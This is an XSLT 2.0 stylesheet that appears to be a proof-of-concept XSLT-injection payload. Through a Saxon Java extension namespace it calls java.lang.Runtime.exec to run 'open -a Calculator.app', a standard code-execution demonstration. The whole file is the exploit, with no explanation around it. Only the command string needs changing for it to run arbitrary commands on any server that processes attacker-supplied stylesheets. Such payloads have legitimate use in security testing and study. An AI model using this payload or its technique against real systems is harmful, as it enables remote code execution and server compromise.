<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
    <xsl:template match="/">
        <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'open -a Calculator.app')" xmlns:Runtime="java.lang.Runtime"/>
    </xsl:template>
</xsl:stylesheet>